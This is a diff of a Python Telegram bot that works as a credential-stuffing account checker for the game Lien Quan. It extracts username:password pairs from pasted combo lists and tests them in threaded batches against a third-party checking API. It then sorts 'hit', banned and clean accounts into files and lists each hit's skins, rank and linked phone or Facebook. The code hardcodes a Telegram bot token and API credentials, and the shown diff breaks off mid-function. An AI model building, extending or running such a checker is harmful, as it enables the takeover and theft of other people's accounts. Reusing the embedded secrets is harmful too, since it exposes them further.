+setInterval(()=>{{fetch('/stats').then(r=>r.json()).then(d=>{{
+document.querySelectorAll('.v')[0].textContent=d.stats.hits||0;
+document.querySelectorAll('.v')[1].textContent=d.stats.banned||0;
+document.querySelectorAll('.v')[2].textContent=d.stats.clean||0;
+const b=document.querySelector('.b');b.textContent=d.checking?'🔴 Dang check':'🟢 San sang';
+b.style.background=d.checking?'#ff9800':'#4caf50';}}).catch(()=>{{}});}},5000);
+</script></body></html>"""
+
+    def log_message(self, *args):
         pass
 
+
 def start_render_server():
-    global start_time
+    global start_time, CUSTOM_AUDIO_DATA
     start_time = time.time()
-    global CUSTOM_AUDIO_DATA
     if os.path.exists(CUSTOM_AUDIO_PATH):
         try:
             with open(CUSTOM_AUDIO_PATH, 'rb') as f:
                 CUSTOM_AUDIO_DATA = f.read()
-            print(f"[*] Da load audio custom: {len(CUSTOM_AUDIO_DATA)} bytes")
         except:
             pass
-    
     try:
-        port = int(os_module.environ.get("PORT", 10000))
-        server = HTTPServer(("0.0.0.0", port), RenderHandler)
-        print(f"[*] Render web server chay tren port {port}")
-        print(f"[*] Dashboard: http://0.0.0.0:{port}")
-        print(f"[*] Audio: http://0.0.0.0:{port}/audio")
-        server.serve_forever()
+        port = int(os.environ.get("PORT", 10000))
+        srv = HTTPServer(("0.0.0.0", port), RenderHandler)
+        print(f"[*] Web port {port}")
+        srv.serve_forever()
     except Exception as e:
-        print(f"[!] Loi web server: {e}")
+        print(f"[!] Web loi: {e}")
 
-threading_module.Thread(target=start_render_server, daemon=True).start()
 
-# ========== CAU HINH - API VERSION 2.1 ==========
+threading.Thread(target=start_render_server, daemon=True).start()
+
+# ========== CONFIG ==========
 TELEGRAM_BOT_TOKEN = "6367532329:AAEewaS0Vd8VjIlB941QXwDzZYtnTwQYBY4"
 ADMIN_CHAT_ID = "5736655322"
 ADMIN_USERNAME = "baohuyno1"
@@ -553,72 +185,40 @@ REQUIRED_CHANNEL = "@hakiiosvip"
 REQUIRED_CHANNEL_ID = "@hakiiosvip"
 REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"
 
-# API VERSION 2.1 - purchase.nhatminh301.com
 API_BASE = "https://purchase.nhatminh301.com"
 API_USERNAME = "api_7567975053"
 API_PASSWORD = "iNH0Tz1daeia"
 
-DEFAULT_THREADS = 50
-DEFAULT_TIMEOUT = 60
-DEFAULT_RETRIES = 3
-DEFAULT_DELAY = 0.3
+DEFAULT_TIMEOUT = 45
+DEFAULT_RETRIES = 4
+DEFAULT_DELAY = 0.25
 
-CHECKMULTI_THREADS = 30
-CHECKMULTI_DELAY = 0.5
-CHECKMULTI_BATCH_SIZE = 10
-CHECKMULTI_BATCH_DELAY = 3.0
+CHECKMULTI_THREADS = 40
+CHECKMULTI_DELAY = 0.4
+CHECKMULTI_BATCH_SIZE = 15
+CHECKMULTI_BATCH_DELAY = 2.0
+CHECKMULTI_MAX_RETRY = 2
+
+CACHE_TTL = 300
+CACHE_MAX_SIZE = 5000
+
+RETRY_STATUS = {429, 500, 502, 503, 504, 408}
+BACKOFF_BASE = 1.5
+BACKOFF_MAX = 30
 
 OUTPUT_LOC = "loc_accounts.txt"
+CLEAN_OUTPUT_FILE = "clean_accounts.txt"
+BANNED_OUTPUT_FILE = "banned_accounts.txt"
+HIT_OUTPUT_FILE = "hit_accounts.txt"
+DEAD_OUTPUT_FILE = "dead_accounts.txt"
+ERROR_OUTPUT_FILE = "error_accounts.txt"
 MAX_MESSAGE_LENGTH = 4000
 
-# ROUTE API VERSION 2.1 - purchase.nhatminh301.com
 SERVICE_ROUTES = {
     "lienquan": {
         "route": "/api/lienquan",
-        "desc": "Lien Quan + FC Online",
+        "desc": "Lien Quan",
         "icon": "🎮",
-        "params": ["tk", "mk"],
-        "extra_params": {"proxy": ""}
-    },
-    "miniworld": {
-        "route": "/api/miniworld",
-        "desc": "Mini World",
-        "icon": "🌍",
-        "params": ["tk", "mk"],
-        "extra_params": {}
-    },
-    "blockmango": {
-        "route": "/api/blockmango",
-        "desc": "Blockman Go",
-        "icon": "🧱",
-        "params": ["tk", "mk"],
-        "extra_params": {}
-    },
-    "deltaforce": {
-        "route": "/api/deltaforce",
-        "desc": "Delta Force (Garena SSO)",
-        "icon": "🔫",
-        "params": ["tk", "mk"],
-        "extra_params": {"proxy": ""}
-    },
-    "hotmail": {
-        "route": "/api/hotmail",
-        "desc": "Hotmail + Inbox",
-        "icon": "📧",
-        "params": ["tk", "mk"],
-        "extra_params": {"keyword": ""}
-    },
-    "fc": {
-        "route": "/api/fc",
-        "desc": "FC Online rieng",
-        "icon": "⚽",
-        "params": ["tk", "mk"],
-        "extra_params": {"proxy": ""}
-    },
-    "fullpack": {
-        "route": "/api/fullpack",
-        "desc": "Fullpack (Tat ca)",
-        "icon": "📦",
         "params": ["tk", "mk"],
         "extra_params": {"proxy": ""}
     }
@@ -627,11 +227,12 @@ SERVICE_ROUTES = {
 checking = False
 stop_event = threading.Event()
 pending_accounts = {}
-stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": 0}
+stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0,
+         "errors": 0, "banned": 0, "clean": 0,
+         "retries": 0, "cache_hits": 0, "removed": 0, "start_time": 0}
 file_lock = threading.Lock()
 stats_lock = threading.Lock()
-cache_results = {}
-cache_lock = threading.Lock()
+banned_lock = threading.Lock()
 
 rate_lock = threading.Lock()
 last_request_time = 0
@@ -639,268 +240,403 @@ start_time = time.time()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
 
+
+class TTLCache:
+    def __init__(self, ttl=CACHE_TTL, max_size=CACHE_MAX_SIZE):
+        self.ttl = ttl
+        self.max_size = max_size
+        self.data = {}
+        self.lock = threading.Lock()
+
+    def get(self, key):
+        with self.lock:
+            e = self.data.get(key)
+            if not e:
+                return None
+            v, ts = e
+            if time.time() - ts > self.ttl:
+                del self.data[key]
+                return None
+            return v
+
+    def set(self, key, value):
+        with self.lock:
+            if len(self.data) >= self.max_size:
+                old = sorted(self.data.items(), key=lambda x: x[1][1])[:self.max_size // 4]
+                for k, _ in old:
+                    self.data.pop(k, None)
+            self.data[key] = (value, time.time())
+
+    def clear(self):
+        with self.lock:
+            self.data.clear()
+
+
+api_cache = TTLCache()
+
+# ========== BAN DETECTION ==========
+BAN_KEYWORDS = [
+    "banned", "ban", "bi khoa", "bị khóa", "khoa", "khóa",
+    "blocked", "block", "suspended", "suspend", "locked", "lock",
+    "vi pham", "vi phạm", "violation", "vipham",
+    "khoa tai khoan", "khóa tài khoản", "account locked",
+    "account banned", "account suspended", "permanently banned",
+    "tam khoa", "tạm khóa", "temporary ban", "permanent ban",
+    "vinh vien", "vĩnh viễn", "permanent", "dính sđt", "dinh sdt",
+    "dính fb", "dinh fb"
+]
+
+
+def is_account_banned(result_data):
+    if not isinstance(result_data, dict):
+        return False, "unknown"
+
+    for f in ["banned", "ban", "aov_banned", "is_banned", "isBanned",
+              "ban_status", "account_banned", "account_status",
+              "status_account", "tinh_trang", "trang_thai", "status",
+              "locked", "is_locked", "isLocked", "suspended",
+              "blocked", "is_blocked", "disabled"]:
+        if f in result_data:
+            v = result_data[f]
+            if isinstance(v, bool):
+                return (True, f"{f}=True") if v else (False, f"{f}=False")
+            if isinstance(v, (int, float)):
+                if v == 1:
+                    return True, f"{f}=1"
+                if v == 0:
+                    return False, f"{f}=0"
+            if isinstance(v, str):
+                vl = v.lower().strip()
+                if vl in ["yes", "true", "1", "banned", "ban", "blocked",
+                          "suspended", "locked", "disabled", "forbidden"]:
+                    return True, f"{f}={v}"
+                if vl in ["no", "false", "0", "active", "normal", "ok",
+                          "clean", "unbanned", "none", "null", ""]:
+                    return False, f"{f}={v}"
+                for kw in BAN_KEYWORDS:
+                    if kw in vl:
+                        if any(n in vl for n in ["khong", "không", "not ", "un", "no "]):
+                            continue
+                        return True, f"{f} chua '{kw}'"
+
+    for f in ["ban_reason", "ly_do_ban", "lydohan", "reason_ban",
+              "ban_message", "ban_note", "ly_do_khoa"]:
+        if f in result_data and result_data[f]:
+            r = str(result_data[f]).strip()
+            if r and r.lower() not in ["none", "null", "", "n/a", "no"]:
+                return True, f"{f}={r}"
+
+    for f in ["ban_until", "ban_expires", "ban_expire", "expires_ban",
+              "thoi_gian_ban", "khoa_den", "ban_end"]:
+        if f in result_data and result_data[f]:
+            v = str(result_data[f]).strip()
+            if v and v.lower() not in ["none", "null", "", "n/a", "no", "0"]:
+                if v not in ["0000-00-00", "1970-01-01", "0000-00-00 00:00:00"]:
+                    return True, f"{f}={v}"
+
+    for f in ["message", "msg", "error", "error_message", "description", "desc"]:
+        if f in result_data and result_data[f]:
+            m = str(result_data[f]).lower()
+            for kw in BAN_KEYWORDS:
+                if kw in m:
+                    if any(n in m for n in ["khong bi", "không bị", "not banned",
+                                             "chua bi", "chưa bị", "unbanned",
+                                             "khong khoa", "không khóa"]):
+                        continue
+                    return True, f"{f} chua '{kw}'"
+
+    for f in ["status", "account_status", "trang_thai", "state"]:
+        if f in result_data and result_data[f]:
+            st = str(result_data[f]).lower().strip()
+            if st in ["banned", "ban", "blocked", "suspended", "locked",
+                      "disabled", "forbidden", "inactive"]:
+                return True, f"{f}={st}"
+
+    return False, "clean"
+
+
+def save_to_file(filepath, username, password, extra=""):
+    with banned_lock:
+        try:
+            with open(filepath, 'a', encoding='utf-8') as f:
+                if extra:
+                    f.write(f"{username}:{password}|{extra}\n")
+                else:
+                    f.write(f"{username}:{password}\n")
+        except Exception as e:
+            print(f"[!] Loi luu {filepath}: {e}")
+
+
+def clear_output_files():
+    for fn in [CLEAN_OUTPUT_FILE, BANNED_OUTPUT_FILE, HIT_OUTPUT_FILE,
+               DEAD_OUTPUT_FILE, ERROR_OUTPUT_FILE]:
+        try:
+            if os.path.exists(fn):
+                os.remove(fn)
+        except:
+            pass
+
+
+# ========== FORMAT ==========
+def _is_empty(v):
+    if v is None or v == "" or v == {} or v == []:
+        return True
+    if isinstance(v, (int, float)) and v == 0:
+        return True
+    if isinstance(v, str) and v in ["0", "00", "000", "N/A"]:
+        return True
+    return False
+
+
+def format_hit_info(username, password, service, result_data):
+    sep = "━━━━━━━━━ ✅ HIT ━━━━━━━━━"
+    is_banned, ban_reason = is_account_banned(result_data)
+    lines = [sep, ""]
+    lines.append(f"🔑 <code>{username}:{password}</code>")
+
+    if not isinstance(result_data, dict):
+        lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━")
+        return "\n".join(lines)
+
+    def g(*keys):
+        for k in keys:
+            if k in result_data and not _is_empty(result_data[k]):
+                return result_data[k]
+        return None
+
+    def fb(v):
+        if isinstance(v, bool):
+            return "Yes" if v else "No"
+        if isinstance(v, str):
+            vl = v.lower().strip()
+            if vl in ["true", "yes", "1"]:
+                return "Yes"
+            if vl in ["false", "no", "0"]:
+                return "No"
+        return v
+
+    def fs(v):
+        return fix_encoding(v) if isinstance(v, str) else v
+
+    def fl(v):
+        if isinstance(v, (list, tuple)):
+            return ", ".join(fix_encoding(str(i)) for i in v)
+        return fix_encoding(str(v))
+
+    mapping = [
+        ("👤 UID", ["uid", "id"], None),
+        ("👤 Nickname", ["nickname", "aov_name", "name"], None),
+        ("🌐 Region", ["region", "server"], None),
+        ("💲 Sò", ["so", "shells"], None),
+        ("💰 Nạp sò", ["nap_so"], None),
+        ("📩 EMAIL", ["email_verified", "email"], "bool"),
+        ("📱 SĐT", ["mobile_bound", "phone", "sdt"], "sdt"),
+        ("🛡 PASS", ["password_set"], "bool"),
+        ("🔗 FB", ["fb_linked", "fb"], "fb"),
+        ("⏰ Login cuối", ["last_login"], None),
+        ("📅 Tạo GR", ["garena_created", "created_at"], None),
+        ("🔥 NAME", ["aov_name"], None),
+        ("👑 RANK", ["aov_rank"], None),
+        ("✨ LEVEL", ["aov_level"], None),
+        ("📅 Ngày tạo TK", ["ngay_tao_tk"], None),
+        ("💎 SKIN", ["aov_total_skins"], None),
+        ("💪 HERO", ["aov_total_champs", "aov_total_heroes"], None),
+        ("⚡️ QH", ["aov_total_relationships"], None),
+        ("📄 CCCD", ["cccd"], "bool"),
+        ("🛡 Authen", ["authen"], "bool"),
+    ]
+
+    ban_val = g("banned", "ban", "aov_banned")
+    ban_until = g("ban_until", "ban_expires")
+
+    for label, keys, kind in mapping:
+        v = g(*keys)
+        if v is None:
+            continue
+        if kind == "bool":
+            lines.append(f"{label}: {fb(v)}")
+        elif kind == "sdt":
+            if isinstance(v, str) and "[" in v:
+                lines.append(f"{label}: {fs(v)}")
+            else:
+                lines.append(f"{label}: {fb(v)}")
+        elif kind == "fb":
+            if isinstance(v, str) and "[" in v:
+                lines.append(f"{label}: {fs(v).upper()}")
+            elif isinstance(v, str) and v.upper() in ["YES", "NO"]:
+                lines.append(f"{label}: {v.upper()}")
+            else:
+                lines.append(f"{label}: {fb(v)}")
+        else:
+            lines.append(f"{label}: {fs(v)}")
+
+    if ban_val is not None or ban_until is not None:
+        bv = ban_val
+        if isinstance(bv, bool):
+            bv = "YES" if bv else "NO"
+        elif isinstance(bv, str):
+            bv = bv.upper()
+        if ban_until and bv == "YES":
+            lines.append(f"🚫 BAND: YES [đến {fs(ban_until)}]")
+        elif bv:
+            lines.append(f"🚫 BAND: {bv}")
+
+    ss_list = g("aov_ss_list")
+    ss_cnt = g("aov_ss")
+    if ss_list:
+        lines.append(f"✨ SS: {ss_cnt or len(ss_list)} [{fl(ss_list)}]")
+    elif ss_cnt is not None:
+        lines.append(f"✨ SS: {fs(ss_cnt)}")
+
+    sss_list = g("aov_sss_list")
+    sss_cnt = g("aov_sss")
+    if sss_list:
+        lines.append(f"🔥 SSS: {sss_cnt or len(sss_list)} [{fl(sss_list)}]")
+    elif sss_cnt is not None:
+        lines.append(f"🔥 SSS: {fs(sss_cnt)}")
+
+    anime_list = g("aov_anime_list")
+    anime_cnt = g("aov_anime")
+    if anime_list:
+        lines.append(f"🔥 Anime: {anime_cnt or len(anime_list)} [{fl(anime_list)}]")
+    elif anime_cnt is not None:
+        lines.append(f"🔥 Anime: {fs(anime_cnt)}")
+
+    other_list = g("aov_other_list")
+    other_cnt = g("aov_other")
+    if other_list:
+        lines.append(f"🎲 Other: {other_cnt or len(other_list)} [{fl(other_list)}]")
+    elif other_cnt is not None:
+        lines.append(f"🎲 Other: {fs(other_cnt)}")
+
+    tt = g("tinh_trang", "status_account")
+    if tt is not None:
+        lines.append("")
+        lines.append(f"📋 Tình Trạng: {fs(tt)}")
+
+    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━")
+    return "\n".join(lines)
+
+
+# ========== UTILS ==========
 def rate_limit(delay=DEFAULT_DELAY):
     global last_request_time
     with rate_lock:
-        current_time = time.time()
-        time_since_last = current_time - last_request_time
-        if time_since_last < delay:
-            sleep_time = delay - time_since_last
-            time.sleep(sleep_time)
+        now = time.time()
+        since = now - last_request_time
+        if since < delay:
+            time.sleep(delay - since)
         last_request_time = time.time()
+
 
 def fix_encoding(text):
     if not isinstance(text, str):
         return text
-    
-    replacements = {
-        'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
-        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
-        'Ã¢': 'â', 'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì',
-        'á»‹': 'ị', 'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò',
-        'Ãº': 'ú', 'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ',
-        'á»·': 'ỷ', 'á»µ': 'ỵ',
-        'Nghiá»‡p': 'Nghiệp', 'Hoáº£': 'Hoả', 'YÃªu': 'Yêu', 'Háº­u': 'Hậu',
-        'Tháº¿': 'Thế', 'Tá»­': 'Tử', 'Nguyá»‡t': 'Nguyệt', 'Tá»™c': 'Tộc',
-        'SiÃªu': 'Siêu', 'viá»‡t': 'việt', 'Ngá»™': 'Ngộ', 'KhÃ´ng': 'Không',
-        'Äao': 'Đao', 'phá»§': 'phủ', 'táº­n': 'tận', 'tháº¿': 'thế',
-        'Giai': 'Giai', 'Ä‘iá»‡u': 'điệu', 'GiÃ¡ng': 'Giáng', 'Sinh': 'Sinh',
-        'Äá»“ng': 'Đồng', 'phá»¥c': 'phục', 'Cáº¥p': 'Cấp', 'Tá»‘i': 'Tối', 
-        'ThÆ°á»£ng': 'Thượng', 'hÃ nh': 'hành', 'K.CÆ°Æ¡ng': 'K.Cương',
-        'Tel\'Annas': "Tel'Annas", 'VÅ©': 'Vũ', 'khÃºc': 'khúc', 'yÃªu': 'yêu',
-        'Ã¡': 'á', 'Ã¢': 'â', 'Äƒ': 'ă', 'áº¯': 'ắ', 'áº±': 'ằ',
-        'áº³': 'ẳ', 'áºµ': 'ẵ', 'áº·': 'ặ', 'áº¥': 'ấ', 'áº§': 'ầ',
-        'áº©': 'ẩ', 'áº«': 'ẫ', 'áº­': 'ậ', 'á»“': 'ồ', 'á»•': 'ổ',
-        'á»—': 'ỗ', 'á»™': 'ộ', 'á»': 'ở', 'á»¡': 'ỡ', 'á»£': 'ợ',
-        'á»§': 'ủ', 'Å©': 'ũ', 'á»¥': 'ụ', 'Ã¹': 'ù', 'Ãº': 'ú',
-        'á»©': 'ứ', 'á»«': 'ừ', 'á»­': 'ử', 'á»¯': 'ữ', 'á»±': 'ự',
-        'á»‰': 'ỉ', 'á»‹': 'ị', 'áº¹': 'ẻ', 'áº»': 'ẻ', 'áº½': 'ẽ',
-        'áº¹': 'ẹ', 'á»‰': 'ỉ', 'á»‹': 'ị'
-    }
-    
-    for old, new in replacements.items():
-        text = text.replace(old, new)
-    
-    if any(char in text for char in ['Ã', 'Ä', 'Æ', 'á»', 'áº', 'Å©', 'Ä©']):
+    r = {'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
+         'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô', 'Ã¢': 'â',
+         'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì', 'á»‹': 'ị',
+         'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò', 'Ãº': 'ú',
+         'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ', 'á»·': 'ỷ', 'á»µ': 'ỵ',
+         'Nghiá»‡p': 'Nghiệp', 'Hoáº£': 'Hoả', 'YÃªu': 'Yêu'}
+    for o, n in r.items():
+        text = text.replace(o, n)
+    if any(c in text for c in ['Ã', 'Ä', 'Æ', 'á»', 'áº', 'Å©', 'Ä©']):
         try:
-            fixed = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
-            if fixed != text and len(fixed) > 0:
-                text = fixed
+            fx = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
+            if fx != text and len(fx) > 0:
+                text = fx
         except:
             pass
-    
     return text
+
 
 def is_user_member(user_id):
     try:
-        chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
-        status = chat_member.status
-        if status in ['member', 'administrator', 'creator']:
-            return True
-        return False
+        cm = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
+        return cm.status in ['member', 'administrator', 'creator']
     except Exception as e:
-        print(f"[!] Loi kiem tra thanh vien: {e}")
+        print(f"[!] Loi member: {e}")
         return False
+
 
 def check_membership(message):
-    user_id = message.from_user.id
-    if is_user_member(user_id):
+    if is_user_member(message.from_user.id):
         return True
-    
-    markup = telebot.types.InlineKeyboardMarkup()
-    join_button = telebot.types.InlineKeyboardButton(
-        text="📢 THAM GIA KENH BAT BUOC",
-        url=REQUIRED_CHANNEL_URL
-    )
-    check_button = telebot.types.InlineKeyboardButton(
-        text="✅ TOI DA THAM GIA",
-        callback_data="check_join"
-    )
-    markup.add(join_button)
-    markup.add(check_button)
-    
-    safe_send_message(
-        message.chat.id,
-        f"""
-🔒 <b>BAN CHUA THAM GIA KENH BAT BUOC!</b>
+    mk = telebot.types.InlineKeyboardMarkup()
+    mk.add(telebot.types.InlineKeyboardButton(
+        text="📢 THAM GIA KENH", url=REQUIRED_CHANNEL_URL))
+    mk.add(telebot.types.InlineKeyboardButton(
+        text="✅ TOI DA THAM GIA", callback_data="check_join"))
+    safe_send_message(message.chat.id, f"""
+🔒 <b>CHUA THAM GIA KENH!</b>
 
-📢 Vui long tham gia kenh sau de su dung bot:
+📢 Vui long tham gia:
 👉 <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
 
-Sau khi tham gia, bam nut ben duoi de xac nhan!
-""",
-        parse_mode="HTML"
-    )
-    
+Sau do bam nut xac nhan!
+""")
     try:
-        bot.send_message(message.chat.id, "👇 Xac nhan sau khi tham gia:", reply_markup=markup)
+        bot.send_message(message.chat.id, "👇 Xac nhan:", reply_markup=mk)
     except:
         pass
-    
     return False
 
-@bot.callback_query_handler(func=lambda call: call.data == "check_join")
-def callback_check_join(call):
-    user_id = call.from_user.id
-    
-    if is_user_member(user_id):
-        bot.answer_callback_query(call.id, "✅ Xac nhan thanh cong!")
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-        safe_send_message(
-            call.message.chat.id,
-            "✅ <b>XAC NHAN THANH CONG!</b>\n\nChao mung ban den voi bot!\nDung /start de xem huong dan."
-        )
-    else:
-        bot.answer_callback_query(call.id, "❌ Ban chua tham gia kenh!", show_alert=True)
-        safe_send_message(
-            call.message.chat.id,
-            f"""
-❌ <b>BAN CHUA THAM GIA KENH!</b>
 
-Vui long tham gia: <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
-Sau do bam nut xac nhan lai.
-"""
-        )
+@bot.callback_query_handler(func=lambda c: c.data == "check_join")
+def cb_check_join(call):
+    if is_user_member(call.from_user.id):
+        bot.answer_callback_query(call.id, "✅ OK!")
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
+        safe_send_message(call.message.chat.id,
+                          "✅ <b>XAC NHAN THANH CONG!</b>\n\n/start de bat dau.")
+    else:
+        bot.answer_callback_query(call.id, "❌ Chua tham gia!", show_alert=True)
+
 
 def safe_send_message(chat_id, text, parse_mode="HTML"):
     if not text:
         return
-    
     text = fix_encoding(text)
-    
     if len(text) > MAX_MESSAGE_LENGTH:
         parts = []
-        current_part = ""
-        lines = text.split('\n')
-        
-        for line in lines:
-            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
-                parts.append(current_part)
-                current_part = line + '\n'
+        cur = ""
+        for ln in text.split('\n'):
+            if len(cur) + len(ln) + 1 > MAX_MESSAGE_LENGTH:
+                parts.append(cur)
+                cur = ln + '\n'
             else:
-                current_part += line + '\n'
-        
-        if current_part:
-            parts.append(current_part)
-        
-        for part in parts:
+                cur += ln + '\n'
+        if cur:
+            parts.append(cur)
+        for p in parts:
             try:
-                bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
+                bot.send_message(chat_id, p.strip(), parse_mode=parse_mode)
                 time.sleep(0.1)
-            except Exception as e:
-                print(f"[!] Loi gui tin nhan: {e}")
+            except:
                 try:
-                    bot.send_message(chat_id, part.strip())
+                    bot.send_message(chat_id, p.strip())
                 except:
                     pass
     else:
         try:
             bot.send_message(chat_id, text, parse_mode=parse_mode)
         except Exception as e:
-            print(f"[!] Loi gui tin nhan: {e}")
+            print(f"[!] Send: {e}")
             try:
                 bot.send_message(chat_id, text)
             except:
                 pass
 
-def loc_tk_mk_only(content):
-    accounts = []
-    seen = set()
-    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
-    
-    if not content:
-        return accounts, stats_loc
-    
-    pattern_colon = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
-    pattern_pipe = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
-    
-    lines = content.split('\n')
-    stats_loc["total"] = len(lines)
-    
-    for line in lines:
-        line = line.strip()
-        if not line:
-            continue
-        
-        if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
-            continue
-        if re.match(r'^\d+$', line):
-            continue
-        
-        matches = re.findall(pattern_colon, line)
-        if matches:
-            for user, pwd in matches:
-                if is_time_value(user) or is_time_value(pwd):
-                    continue
-                if is_valid_account(user, pwd):
-                    key = f"{user}:{pwd}"
-                    if key not in seen:
-                        seen.add(key)
-                        accounts.append((user, pwd))
-                        stats_loc["valid"] += 1
-                    else:
-                        stats_loc["duplicate"] += 1
-                else:
-                    stats_loc["invalid"] += 1
-            continue
-        
-        matches = re.findall(pattern_pipe, line)
-        if matches:
-            for user, pwd in matches:
-                if is_time_value(user) or is_time_value(pwd):
-                    continue
-                if is_valid_account(user, pwd):
-                    key = f"{user}:{pwd}"
-                    if key not in seen:
-                        seen.add(key)
-                        accounts.append((user, pwd))
-                        stats_loc["valid"] += 1
-                    else:
-                        stats_loc["duplicate"] += 1
-                else:
-                    stats_loc["invalid"] += 1
-    
-    if not accounts:
-        all_matches = re.findall(pattern_colon, content)
-        for user, pwd in all_matches:
-            if is_time_value(user) or is_time_value(pwd):
-                continue
-            if is_valid_account(user, pwd):
-                key = f"{user}:{pwd}"
-                if key not in seen:
-                    seen.add(key)
-                    accounts.append((user, pwd))
-                    stats_loc["valid"] += 1
-                else:
-                    stats_loc["duplicate"] += 1
-            else:
-                stats_loc["invalid"] += 1
-        
-        if not accounts:
-            all_matches = re.findall(pattern_pipe, content)
-            for user, pwd in all_matches:
-                if is_time_value(user) or is_time_value(pwd):
-                    continue
-                if is_valid_account(user, pwd):
-                    key = f"{user}:{pwd}"
-                    if key not in seen:
-                        seen.add(key)
-                        accounts.append((user, pwd))
-                        stats_loc["valid"] += 1
-                    else:
-                        stats_loc["duplicate"] += 1
-                else:
-                    stats_loc["invalid"] += 1
-    
-    return accounts, stats_loc
 
+# ========== LOC TAI KHOAN ==========
 def is_time_value(value):
     if not value:
         return False
-    
     value = str(value).strip()
-    
-    time_patterns = [
+    pats = [
         r'^\d{1,2}:\d{2}(:\d{2})?$',
         r'^\d{1,2}:\d{2}(:\d{2})?\s*(AM|PM|am|pm)$',
         r'^\d{1,2}\.\d{2}(\.\d{2})?$',
@@ -919,12 +655,11 @@ def is_time_value(value):
         r'^\d{10,13}$',
         r'^\d{1,2}\s*(AM|PM|am|pm)$',
     ]
-    
-    for pattern in time_patterns:
-        if re.match(pattern, value, re.IGNORECASE):
+    for p in pats:
+        if re.match(p, value, re.IGNORECASE):
             return True
-    
     return False
+
 
 def is_valid_account(user, pwd):
     if len(user) < 2 or len(pwd) < 1:
@@ -935,906 +670,628 @@ def is_valid_account(user, pwd):
         return False
     if re.match(r'^\d+$', user) or re.match(r'^\d+$', pwd):
         return False
-    
-    user_lower = user.lower()
-    skip_keywords = ['time', 'date', 'ngay', 'thoi_gian', 'thoigian', 'gio', 'giờ', 
-                     'phut', 'phút', 'giay', 'giây', 'timestamp', 'datetime',
-                     'created', 'login', 'session', 'expires', 'expire', 'valid',
-                     'http', 'https', 'www', 'com', 'net', 'org', 'shop', 'share', 
-                     'final', 'name', 'level', 'rank', 'status', 'email', 'phone', 
-                     'sdt', 'cccd', 'fb', 'ban', 'ss', 'sss', 'anime', 'other', 
-                     'am', 'pm', 'utc', 'gmt']
-    
-    for keyword in skip_keywords:
-        if keyword in user_lower:
+    ul = user.lower()
+    for k in ['time', 'date', 'ngay', 'thoi_gian', 'thoigian', 'gio',
+              'phut', 'giay', 'timestamp', 'datetime', 'created', 'login',
+              'session', 'expires', 'expire', 'valid', 'http', 'https',
+              'www', 'com', 'net', 'org', 'shop', 'share', 'final', 'name',
+              'level', 'rank', 'status', 'email', 'phone', 'sdt', 'cccd',
+              'fb', 'ban', 'ss', 'sss', 'anime', 'other', 'am', 'pm',
+              'utc', 'gmt']:
+        if k in ul:
             return False
-    
     if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@+-]*$', user):
         return False
     if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-+]+$', pwd):
         return False
-    
     return True
+
+
+def loc_tk_mk_only(content):
+    accounts = []
+    seen = set()
+    st = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
+    if not content:
+        return accounts, st
+    pc = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
+    pp = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
+    lines = content.split('\n')
+    st["total"] = len(lines)
+    for ln in lines:
+        ln = ln.strip()
+        if not ln:
+            continue
+        if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', ln):
+            continue
+        if re.match(r'^\d+$', ln):
+            continue
+        ms = re.findall(pc, ln) or re.findall(pp, ln)
+        for u, p in ms:
+            if is_time_value(u) or is_time_value(p):
+                continue
+            if is_valid_account(u, p):
+                k = f"{u}:{p}"
+                if k not in seen:
+                    seen.add(k)
+                    accounts.append((u, p))
+                    st["valid"] += 1
+                else:
+                    st["duplicate"] += 1
+            else:
+                st["invalid"] += 1
+    if not accounts:
